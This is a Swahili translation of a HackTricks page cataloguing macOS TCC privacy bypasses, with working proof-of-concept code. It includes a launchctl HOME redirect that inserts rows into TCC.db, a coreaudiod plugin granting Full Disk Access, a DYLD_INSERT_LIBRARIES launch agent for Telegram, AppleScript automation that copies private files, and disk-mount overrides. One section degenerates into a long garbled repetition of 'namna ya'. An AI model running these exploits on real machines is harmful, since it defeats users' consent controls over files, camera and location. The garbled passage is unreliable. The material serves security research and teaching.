# Kupita kwa TCC ya macOS

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Kwa kazi

### Kupita kwa Kuandika

Hii sio njia ya kupita, ni jinsi TCC inavyofanya kazi: **Haitoi ulinzi dhidi ya kuandika**. Ikiwa Terminal **haina ruhusa ya kusoma Desktop ya mtumiaji, bado inaweza kuandika ndani yake**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
**Atributi ya ziada `com.apple.macl`** inaongezwa kwenye **faili mpya** ili kumpa **programu ya muundaji** upatikanaji wa kuisoma.

### Kupitisha SSH

Kwa chaguo-msingi, upatikanaji kupitia **SSH ulikuwa na "Upatikanaji Kamili wa Diski"**. Ili kuzima hii, unahitaji kuwa na hiyo iliyoorodheshwa lakini imezimwa (kuiondoa kutoka kwenye orodha haitaondoa haki hizo):

![](<../../../../../.gitbook/assets/image (569).png>)

Hapa unaweza kupata mifano ya jinsi **malwares zingine zilivyoweza kuepuka ulinzi huu**:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

{% hint style="danger" %}
Tafadhali kumbuka kuwa sasa, ili kuweza kuwezesha SSH unahitaji **Upatikanaji Kamili wa Diski**
{% endhint %}

### Kusimamia Upanuzi - CVE-2022-26767

Atributi ya **`com.apple.macl`** inatolewa kwa faili ili kumpa **programu fulani ruhusa ya kuisoma.** Atributi hii inawekwa wakati wa **kuburuta na kuacha** faili juu ya programu, au wakati mtumiaji anapofungua faili kwa **kubofya mara mbili** na kuifungua na **programu ya chaguo-msingi**.

Kwa hivyo, mtumiaji anaweza **kujiandikisha programu mbaya** kusimamia upanuzi wote na kuita Huduma za Kuzindua kufungua faili yoyote (kwa hivyo faili mbaya itapewa upatikanaji wa kuisoma).

### iCloud

Kwa kibali cha **`com.apple.private.icloud-account-access`**, niwezekanavyo kuwasiliana na huduma ya XPC ya **`com.apple.iCloudHelper`** ambayo itatoa **vitambulisho vya iCloud**.

**iMovie** na **Garageband** walikuwa na kibali hiki na vingine vilivyowezesha.

Kwa habari zaidi kuhusu uvumbuzi wa **kupata vitambulisho vya iCloud** kutoka kwa kibali hicho, angalia mazungumzo: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

Programu yenye kibali cha **`kTCCServiceAppleEvents`** itaweza **kudhibiti Programu nyingine**. Hii inamaanisha kuwa inaweza kuwa na uwezo wa **kutumia vibaya ruhusa zilizotolewa kwa Programu nyingine**.

Kwa habari zaidi kuhusu Apple Scripts angalia:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

Kwa mfano, ikiwa Programu ina **ruhusa ya Utoaji wa Automation juu ya `iTerm`**, kwa mfano katika mfano huu **`Terminal`** ina upatikanaji juu ya iTerm:

<figure><img src="../../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### Juu ya iTerm

Terminal, ambayo haina FDA, inaweza kuita iTerm, ambayo inayo, na kuitumia kufanya vitendo:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```
{% endcode %}
```bash
osascript iterm.script
```
#### Juu ya Finder

Au ikiwa Programu ina ufikiaji juu ya Finder, inaweza kuwa na script kama hii:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Kwa Tabia ya Programu

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Mtumiaji wa **tccd daemon** anatumia **`HOME`** **env** kubadilisha kwenye hifadhidata ya watumiaji ya TCC kutoka: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Kulingana na [chapisho hili la Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) na kwa sababu daemon ya TCC inaendeshwa kupitia `launchd` ndani ya kikoa cha mtumiaji wa sasa, ni **inawezekana kudhibiti mazingira yote** yanayopitishwa kwake.\
Hivyo, **mshambuliaji anaweza kuweka `$HOME` mazingira** kwenye **`launchctl`** ili ielekeze kwenye **folda iliyodhibitiwa**, **kuanzisha tena** daemon ya **TCC**, na kisha **kubadilisha moja kwa moja hifadhidata ya TCC** ili kujipatia **kila haki ya TCC inayopatikana** bila kuuliza mtumiaji mwisho.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Maelezo

Maelezo yalikuwa na ufikiaji wa maeneo yaliyolindwa na TCC lakini wakati maelezo yanapotengenezwa, yanatengenezwa katika eneo lisilolindwa. Kwa hivyo, unaweza kuomba maelezo kuiga faili iliyolindwa katika maelezo (kwa hivyo katika eneo lisilolindwa) na kisha kupata faili hiyo:

<figure><img src="../../../../../.gitbook/assets/image (6) (1) (3).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Uhamishaji

Binary `/usr/libexec/lsd` na maktaba `libsecurity_translocate` ilikuwa na ruhusa ya `com.apple.private.nullfs_allow` ambayo iliruhusu kuunda mlima wa **nullfs** na ilikuwa na ruhusa ya `com.apple.private.tcc.allow` na **`kTCCServiceSystemPolicyAllFiles`** ili kupata faili zote.

Ilikuwa inawezekana kuongeza sifa ya karantini kwa "Library", kuita huduma ya XPC ya **`com.apple.security.translocation`** na kisha itaunganisha Library na **`$TMPDIR/AppTranslocation/d/d/Library`** ambapo nyaraka zote ndani ya Library zinaweza **kupatikana**.

### CVE-2023-38571 - Muziki na TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Muziki`** ina kipengele kizuri: Wakati inafanya kazi, ita **ingiza** faili zilizodondoshwa kwenye **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** kwenye "maktaba ya media" ya mtumiaji. Zaidi ya hayo, inaita kitu kama: **`rename(a, b);`** ambapo `a` na `b` ni:

* `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
* `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

Tabia hii ya **`rename(a, b);`** ni hatari kwa **Mzunguko wa Mashindano**, kwani inawezekana kuweka faili bandia ya **TCC.db** ndani ya folda ya `Automatically Add to Music.localized` na kisha wakati folda mpya (b) inapoundwa ili kuiga faili, ifuta faili hiyo, na ielekeze kwenye **`~/Library/Application Support/com.apple.TCC`**/.

### SQLITE\_SQLLOG\_DIR - CVE-2023-32422

Ikiwa **`SQLITE_SQLLOG_DIR="njia/folder"`** inamaanisha kwamba **db yoyote iliyofunguliwa inakopiwa kwenye njia hiyo**. Katika CVE hii, udhibiti huu ulitumiwa vibaya kuandika ndani ya **database ya SQLite** ambayo itafunguliwa na mchakato na FDA ya database ya TCC, na kisha kutumia **`SQLITE_SQLLOG_DIR`** na symlink kwenye jina la faili ili wakati database hiyo inapofunguliwa, faili ya mtumiaji **TCC.db inaandikwa juu** ya ile iliyofunguliwa.\
**Maelezo zaidi** [**katika andiko**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **na**[ **katika mazungumzo**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y\&t=20548s).

### **SQLITE\_AUTO\_TRACE**

Ikiwa mazingira ya **`SQLITE_AUTO_TRACE`** yameset, maktaba ya **`libsqlite3.dylib`** itaanza **kurekodi** maswali yote ya SQL. Programu nyingi za Apple zilitumia maktaba hii kuwa na ufikiaji wa habari zilizolindwa na TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL\_DUMP\_PIPELINES\_TO\_JSON\_FILE - CVE-2023-32407

**Hii variable ya mazingira inatumika na mfumo wa `Metal`** ambao ni tegemezi kwa programu mbalimbali, hasa `Music`, ambayo ina FDA.

Kwa kuweka yafuatayo: `MTL_DUMP_PIPELINES_TO_JSON_FILE="njia/jina"`. Ikiwa `njia` ni saraka halali, kosa litasababishwa na tunaweza kutumia `fs_usage` kuona kinachoendelea katika programu:

* faili itafunguliwa (`open()`), itaitwa `njia/.dat.nosyncXXXX.XXXXXX` (X ni nambari za nasibu)
* moja au zaidi ya `write()` itaandika maudhui kwenye faili (hatudhibiti hii)
* `njia/.dat.nosyncXXXX.XXXXXX` itabadilishwa jina (`rename()`) kuwa `njia/jina`

Hii ni kuandika faili ya muda mfupi, ikifuatiwa na **`rename(old, new)`** **ambayo sio salama**.

Sio salama kwa sababu inahitaji **kutatua njia za zamani na mpya kwa tofauti**, ambayo inaweza kuchukua muda na inaweza kuwa na hatari ya Mashindano ya Hali. Kwa maelezo zaidi unaweza kuangalia kazi ya `xnu` inayoitwa `renameat_internal()`.

{% hint style="danger" %}
Kwa hiyo, kimsingi, ikiwa mchakato wenye mamlaka anabadilisha jina kutoka kwenye saraka unayodhibiti, unaweza kushinda RCE na kufanya iweze kufikia faili tofauti au, kama katika CVE hii, kufungua faili ambayo programu yenye mamlaka imeunda na kuhifadhi FD.

Ikiwa jina la kubadilisha linapata saraka unayodhibiti, wakati umebadilisha faili ya chanzo au una FD kwake, unabadilisha faili ya marudio (au saraka) ili iweze kuonyesha kiungo cha ishara, ili uweze kuandika wakati wowote unapotaka.
{% endhint %}

Hii ilikuwa shambulio katika CVE: Kwa mfano, ili kubadilisha `TCC.db` ya mtumiaji, tunaweza:

* kuunda `/Users/hacker/ourlink` ili ionyeshe kwa `/Users/hacker/Library/Application Support/com.apple.TCC/`
* kuunda saraka `/Users/hacker/tmp/`
* kuweka `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
* kusababisha kosa kwa kukimbia `Music` na hii env var
* kuchukua `open()` ya `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X ni nambari za nasibu)
* hapa pia tunafungua (`open()`) faili hii kwa kuandika, na kushikilia file descriptor
* kubadilisha kwa atomiki `/Users/hacker/tmp` na `/Users/hacker/ourlink` **katika mzunguko**
* tunafanya hivi ili kuongeza nafasi zetu za kufanikiwa kwani dirisha la mashindano ni dogo sana, lakini kupoteza mashindano hakuna madhara yoyote
* subiri kidogo
* jaribu kama tumepata bahati
* ikiwa sivyo, endesha tena kutoka mwanzo

Maelezo zaidi katika [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

{% hint style="danger" %}
Sasa, ikiwa unajaribu kutumia variable ya mazingira `MTL_DUMP_PIPELINES_TO_JSON_FILE`, programu hazitazinduliwa
{% endhint %}

### Apple Remote Desktop

Kama mtumiaji mkuu unaweza kuwezesha huduma hii na **ARD agent itakuwa na ufikiaji kamili wa diski** ambao unaweza kutumiwa vibaya na mtumiaji ili kuifanya ichukue nakala mpya ya **TCC user database**.

## Kwa njia ya **NFSHomeDirectory**

TCC inatumia database katika saraka ya HOME ya mtumiaji ili kudhibiti ufikiaji wa rasilimali maalum kwa mtumiaji katika **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Kwa hiyo, ikiwa mtumiaji anaweza kuanzisha upya TCC na variable ya mazingira ya $HOME ikielekeza kwenye **saraka tofauti**, mtumiaji anaweza kuunda database mpya ya TCC katika **/Library/Application Support/com.apple.TCC/TCC.db** na kudanganya TCC ili itoe ruhusa ya TCC yoyote kwa programu yoyote.

{% hint style="success" %}
Tafadhali kumbuka kuwa Apple inatumia mipangilio iliyohifadhiwa ndani ya wasifu wa mtumiaji katika sifa ya **`NFSHomeDirectory`** kama **thamani ya `$HOME`**, kwa hivyo ikiwa unahatarisha programu na ruhusa ya kubadilisha thamani hii (**`kTCCServiceSystemPolicySysAdminFiles`**), unaweza **kutumia** chaguo hili na kuepuka TCC.
{% endhint %}

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**POC ya kwanza** inatumia [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) na [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) kubadilisha saraka ya **HOME** ya mtumiaji.

1. Pata _csreq_ blob kwa programu ya lengo.
2. Weka faili bandia ya _TCC.db_ na ufikiaji unaohitajika na _csreq_ blob.
3. Toa kuingia kwa Huduma za Saraka ya mtumiaji na [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Badilisha kuingia kwa Huduma za Saraka kubadilisha saraka ya nyumbani ya mtumiaji.
5. Ingiza kuingia iliyobadilishwa ya Huduma za Saraka na [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Acha _tccd_ ya mtumiaji na zima upya mchakato.

POC ya pili iliyotumika **`/usr/libexec/configd`** ambayo ilikuwa na `com.apple.private.tcc.allow` na thamani ya `kTCCServiceSystemPolicySysAdminFiles`.\
Ilikuwa inawezekana kuendesha **`configd`** na chaguo la **`-t`**, mshambuliaji anaweza kubainisha **Bundle desturi ya kupakia**. Kwa hivyo, shambulio linabadilisha njia ya kubadilisha saraka ya nyumbani ya mtumiaji kwa kutumia **`configd` code injection**.

Kwa maelezo zaidi angalia [**ripoti ya awali**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Kwa kuingiza mchakato

Kuna njia tofauti za kuingiza namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna ya namna
### CVE-2020-29621 - Coreaudiod

Binaryi **`/usr/sbin/coreaudiod`** ilikuwa na uwezo wa `com.apple.security.cs.disable-library-validation` na `com.apple.private.tcc.manager`. Ya kwanza **kuruhusu kuingiza nambari** na ya pili ikimpa uwezo wa **kusimamia TCC**.

Binary hii iliruhusu kupakia **programu-jalizi za mtu wa tatu** kutoka kwenye folda `/Library/Audio/Plug-Ins/HAL`. Kwa hiyo, ilikuwa inawezekana **kupakia programu-jalizi na kutumia ruhusa za TCC** na hii PoC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Kwa habari zaidi angalia [**ripoti ya awali**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Programu za Tabaka ya Kifaa (DAL) Plug-Ins

Programu za mfumo ambazo hufungua mkondo wa kamera kupitia Core Media I/O (programu na **`kTCCServiceCamera`**) hulipakia **vipengele hivi** katika mchakato uliopo katika `/Library/CoreMediaIO/Plug-Ins/DAL` (hazina kizuizi cha SIP).

Kuhifadhi tu huko maktaba na **constructor** ya kawaida kutafanya kazi ya **kuingiza namna**.

Programu kadhaa za Apple zilikuwa na udhaifu huu.

### Firefox

Programu ya Firefox ilikuwa na ruhusa za `com.apple.security.cs.disable-library-validation` na `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Kwa habari zaidi juu ya jinsi ya kuitumia [**angalia ripoti ya asili**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` ilikuwa na uwezo wa **`com.apple.private.tcc.allow`** na **`com.apple.security.get-task-allow`**, ambayo iliruhusu kuingiza nambari ndani ya mchakato na kutumia ruhusa za TCC.

### CVE-2023-26818 - Telegram

Telegram ilikuwa na uwezo wa **`com.apple.security.cs.allow-dyld-environment-variables`** na **`com.apple.security.cs.disable-library-validation`**, hivyo ilikuwa inawezekana kuitumia **kupata upatikanaji wa ruhusa zake** kama vile kurekodi kwa kutumia kamera. Unaweza [**kupata mzigo katika andiko**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Tazama jinsi ya kutumia mazingira ya env kwa kupakia maktaba **plist ya desturi** iliumbwa ili kuingiza maktaba hii na **`launchctl`** iliyotumika kuizindua:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Kwa kufungua mwaliko

Inawezekana kuita **`open`** hata wakati wa kufungwa kwa mchanga

### Skrini za Terminali

Ni kawaida sana kutoa **Upatikanaji Kamili wa Diski (FDA)** kwa terminal, angalau kwenye kompyuta zinazotumiwa na watu wa teknolojia. Na inawezekana kuita skrini za **`.terminal`** kwa kutumia hilo.

Skrini za **`.terminal`** ni faili za plist kama hii na amri ya kutekeleza kwenye ufunguo wa **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Programu inaweza kuandika script ya terminal katika eneo kama /tmp na kuizindua na amri kama:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Kwa kufunga

### CVE-2020-9771 - kufunga\_apfs TCC kuvuka na kuongeza mamlaka

**Mtumiaji yeyote** (hata wasio na mamlaka) anaweza kuunda na kufunga nakala ya wakati wa mashine na **kupata faili ZOTE** za nakala hiyo.\
**Mamlaka pekee** inayohitajika ni kwa programu iliyotumiwa (kama `Terminal`) kuwa na **Upatikanaji Kamili wa Diski** (FDA) (`kTCCServiceSystemPolicyAllfiles`) ambayo inahitaji kupewa na msimamizi. 

{% code overflow="wrap" %}
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
{% endcode %}

Maelezo zaidi yanaweza [**kupatikana katika ripoti ya awali**](https://theevilbit.github.io/posts/cve\_2020\_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Kufunga juu ya faili ya TCC

Hata kama faili ya TCC DB imekingwa, ilikuwa inawezekana **kufunga juu ya saraka** faili mpya ya TCC.db:

{% code overflow="wrap" %}
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```
{% endcode %}
```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Angalia **exploit kamili** katika [**maandishi ya awali**](https://theevilbit.github.io/posts/cve-2021-30808/).

### asr

Zana ya **`/usr/sbin/asr`** iliruhusu kunakili diski nzima na kuimount mahali pengine kwa kuzingilia kinga za TCC.

### Huduma za Mahali

Kuna database ya tatu ya TCC katika **`/var/db/locationd/clients.plist`** kuonyesha wateja wanaoruhusiwa **kupata huduma za mahali**.\
Folda ya **`/var/db/locationd/` haikuwa imekingwa kutoka kwa DMG mounting** hivyo ilikuwa inawezekana kuimount plist yetu wenyewe.

## Kupitia programu za kuanza

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

## Kupitia grep

Katika hali kadhaa, faili zitahifadhi habari nyeti kama barua pepe, namba za simu, ujumbe... katika maeneo yasiyolindwa (ambayo ni dosari katika Apple).

<figure><img src="../../../../../.gitbook/assets/image (4) (3).png" alt=""><figcaption></figcaption></figure>

## Bonyeza bandia

Hii haifanyi kazi tena, lakini [**ilifanya kazi hapo awali**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

Njia nyingine kwa kutumia [**matukio ya CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS\_v2\_Wardle.pdf):

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

## Marejeleo

* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
* [**20+ Njia za Kudukua Mifumo ya Faragha ya macOS**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
* [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

<details>

<summary><strong>Jifunze kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
